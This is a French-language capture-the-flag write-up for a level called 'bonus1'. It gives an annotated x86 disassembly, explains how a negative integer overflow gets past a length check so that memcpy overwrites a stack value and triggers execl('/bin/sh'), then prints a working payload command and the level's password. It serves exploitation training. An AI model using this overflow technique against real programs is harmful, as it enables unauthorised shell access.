```
08048424 <main>:
 8048424:	55                   	push   ebp
 8048425:	89 e5                	mov    ebp,esp
 8048427:	83 e4 f0             	and    esp,0xfffffff0
 804842a:	83 ec 40             	sub    esp,0x40
 804842d:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048430:	83 c0 04             	add    eax,0x4
 8048433:	8b 00                	mov    eax,DWORD PTR [eax]
 8048435:	89 04 24             	mov    DWORD PTR [esp],eax
 8048438:	e8 23 ff ff ff       	call   8048360 <atoi@plt>			; int arg1 = atoi(argv[1]);
 804843d:	89 44 24 3c          	mov    DWORD PTR [esp+0x3c],eax
 8048441:	83 7c 24 3c 09       	cmp    DWORD PTR [esp+0x3c],0x9
 8048446:	7e 07                	jle    804844f <main+0x2b>			; if (arg1 <= 9)
 8048448:	b8 01 00 00 00       	mov    eax,0x1						; else return 1;
 804844d:	eb 54                	jmp    80484a3 <main+0x7f>
 804844f:	8b 44 24 3c          	mov    eax,DWORD PTR [esp+0x3c]
 8048453:	8d 0c 85 00 00 00 00 	lea    ecx,[eax*4+0x0]				; &(arg1 * 4)
 804845a:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804845d:	83 c0 08             	add    eax,0x8
 8048460:	8b 00                	mov    eax,DWORD PTR [eax]
 8048462:	89 c2                	mov    edx,eax						; argv[2]
 8048464:	8d 44 24 14          	lea    eax,[esp+0x14]				; char str[44]
 8048468:	89 4c 24 08          	mov    DWORD PTR [esp+0x8],ecx
 804846c:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 8048470:	89 04 24             	mov    DWORD PTR [esp],eax
 8048473:	e8 a8 fe ff ff       	call   8048320 <memcpy@plt>					; memcpy(str, argv[2], &(arg1 * 4))
 8048478:	81 7c 24 3c 46 4c 4f 	cmp    DWORD PTR [esp+0x3c],0x574f4c46
 804847f:	57 
 8048480:	75 1c                	jne    804849e <main+0x7a>					; if ( != 0x574f4c46) return 0;
 8048482:	c7 44 24 08 00 00 00 	mov    DWORD PTR [esp+0x8],0x0
 8048489:	00 
 804848a:	c7 44 24 04 80 85 04 	mov    DWORD PTR [esp+0x4],0x80485	80		; "sh"
 8048491:	08 
 8048492:	c7 04 24 83 85 04 08 	mov    DWORD PTR [esp],0x8048583			; "/bin/sh"
 8048499:	e8 b2 fe ff ff       	call   8048350 <execl@plt>					; execl("/bin/sh", "sh", 0)
 804849e:	b8 00 00 00 00       	mov    eax,0x0
 80484a3:	c9                   	leave  
 80484a4:	c3                   	ret    
```
`int execl(const char *pathname, const char *arg, .../*, (char *) NULL */);`

Bon, l'objectif est pas compliqué, notre payload va dans `argv[2]`, on doit écrire l'adresse `0x574f4c46` dans `esp+0x3c` qui est bien après notre `str`, donc on peut override facilement, et il faudra utiliser `argv[1]` pour copier le nombre parfait de bits dans `str` grâce à un overflow négatif.

On sait que le minimum c'est `-2147483648` et le INTMAX `2147483647`. Donc, on peut jouer sur ces propriétés là.
L'objectif est d'écrire 40 octets de padding + 4 octets (notre "adresse"). Donc 44.

Ici, il faut jouer avec le "modulo" pour trouver la bonne adresse à taper. Déjà une chose, on peut utiliser n'importe quel nombre entre 9 et INT_MIN, par conséquent, si on doit tourner 4 fois (donc ~INT_MIN + ~INT_MIN + ~INT_MIN + ~INT_MIN) et on peut arriver à 48 en laissant s'envoler quelques octets à chaque fois.

Exemple :
INT_MIN - 11:
1. INT_MIN + 11 (-2147483637)
2. (INT_MIN + 11) * 2 = 2 * INT_MIN + 22. Hors, 2*INT_MIN = 0, donc on est à 22.
3. 22 + INT_MIN + 11 = 33 + INT_MIN = -2147483615
4. (INT_MIN + 11) * 2 = (INT_MIN * 4 = INT_MIN * 2 * 2 = 0 * 2 = 0) + 11 * 4 = 44

Bah pour un exemple on tombe juste...

Payload:
```
./bonus1 -2147483637 `python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'`
```

Password:
`579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`